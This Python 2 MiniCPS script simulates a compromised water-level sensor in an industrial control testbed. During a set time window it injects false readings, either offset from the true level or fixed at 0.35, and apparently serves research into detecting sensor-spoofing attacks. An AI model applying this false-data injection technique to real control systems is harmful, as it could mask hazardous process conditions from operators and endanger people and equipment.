from minicps.devices import PLC
from utils import *
import random
import logging
import time
import sys

SENSOR_ADDR = IP['lit101']
LIT101 = ('LIT101', 1)
LIT102 = ('LIT102', 1)

class BadLit101(PLC):
	def pre_loop(self, sleep=0.1):
		logging.basicConfig(filename=LOG_LIT101_FILE, level=logging.DEBUG)
		time.sleep(sleep)
		self.diff_attack_value = -0.02
		self.attack_value = 0.35
		self.bad_data = 0.0
		self.attack_time_begin = 200
		self.attack_time_end = 300
                self.set(LIT101, Y10)
                self.set(LIT102, Y20)

	def main_loop(self):
		count = 0
		while count<=PLC_SAMPLES:
			self.level = float(self.get(LIT101))

			if count >=  self.attack_time_begin and count <= self.attack_time_end:
				if int(sys.argv[1]) == 1:
					# Differential attack
					print "Starting differential attack"
					self.bad_data = self.level + self.diff_attack_value
					logging.debug('LIT101 level %s', self.bad_data)
		                        self.send(LIT101, self.bad_data, SENSOR_ADDR)
				elif int(sys.argv[1]) == 2:
					# Absolute attack
					print "Starting absolute attack"
					self.bad_data = self.attack_value
					logging.debug('LIT101 level %s', self.bad_data)
		                        self.send(LIT101, self.bad_data, SENSOR_ADDR)

			else:
                               logging.debug('LIT101 level %s', self.level)
                               self.send(LIT101, self.level, SENSOR_ADDR)

			count +=1
			time.sleep(PLC_PERIOD_SEC)

if __name__ == '__main__':
	lit101 = BadLit101(name='badlit101',state=STATE,protocol=LIT101_PROTOCOL,memory=GENERIC_DATA,disk=GENERIC_DATA)

